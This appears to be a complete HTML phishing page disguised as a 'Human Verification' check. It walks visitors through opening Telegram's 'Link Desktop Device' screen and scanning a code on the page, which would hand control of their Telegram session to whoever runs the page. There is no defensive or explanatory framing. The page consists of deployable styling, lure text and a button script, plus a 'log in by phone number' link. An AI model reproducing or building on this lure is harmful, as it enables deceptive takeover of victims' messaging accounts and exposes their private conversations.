<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Human Verification</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background-color: #ffffff;
      /* Changed to white */
      font-family: sans-serif;
      transition: background-color 0.3s ease;
      /* Add transition for smooth change */
    }

    .container {
      text-align: center;
      padding: 30px;
      background-color: #ffffff;
      /* Changed to white */
      border-radius: 12px;
      box-shadow: none;
    }

    h1 {
      font-size: 2.5em;
      font-weight: bold;
      color: #000000;
      /* Changed to black */
      margin-bottom: 0.5em;
    }

    p {
      font-size: 1.2em;
      color: #000000;
      /* Changed to black */
      margin-top: 0;
      margin-bottom: 2em;
      font-weight: bold;
    }

    .button {
      display: inline-block;
      padding: 15px 100px;
      /* Further increased padding */
      font-size: 1.1em;
      color: #ffffff;
      /* Changed to white */
      background-color: #285928;
      /* Changed to green */
      border: none;
      border-radius: 8px;
      cursor: pointer;
      text-decoration: none;
      font-weight: normal;
      transition: background-color 0.3s;
      box-shadow: none;
    }

    .button:hover {
      background-color: #234d23;
      /* Changed to darker green */
    }

    #qr-code {
      display: none;
      margin-top: 20px;
      background-color: #222;
      /* Added background color for the second part */
      /* Ensure text is visible on the new background */
    }

    /* Added styles for the second part */
    #qr-code h1 {
      font-weight: bold;
      font-size: 1.5em;
      margin-bottom: 20px;
      color: white;
      /* Changed h1 color to white */
    }

    #qr-code ol {
      text-align: left;
      margin-top: 0px;
      font-size: 1em;
      padding-left: 40px;
      line-height: 1.6em;
      color: white;
      /* Changed ol color to white */
    }

    #qr-code li {
      /* Style for list items */
      margin-bottom: 10px;
      color: white;
      /* Changed li color to white */
    }

    #qr-code .bold-text {
      /* Style for bolding specific text within a list item */
      font-weight: bold;
      color: white;
      /* Changed bold-text color to white */
    }

    #qr-code .login-link {
      margin-top: 20px;
      font-size: 1em;
      color: #8a2be2;
      text-decoration: none;
      display: block;
      /* Added display: block to center the link */
      text-align: center;
      /* Added text-align: center to center the link */
    }
  </style>
</head>

<body>
  <div class="container" id="first-part">
    <h1>Human Verification</h1>
    <p>Verify below to be granted entry</p>
    <button class="button" onclick="showQRCode()">Click here</button>
  </div>

  <div id="qr-code" style="display: none;">
    <h1>Verify you are human by QR Code</h1>

    <ol>
      <li>Open Telegram on your phone</li>
      <li>Go to <span class="bold-text">Settings > Devices > Link Desktop Device</span></li>
      <li>Point your phone at this screen to confirm verification</li>
    </ol>

    <a href="#" class="login-link">LOG IN BY PHONE NUMBER</a>
  </div>

  <script>
    function showQRCode() {
      document.getElementById("first-part").style.display = "none";
      document.getElementById("qr-code").style.display = "block";
      document.body.style.backgroundColor = "#222"; // Change background color to match #qr-code
    }
  </script>
</body>

</html>
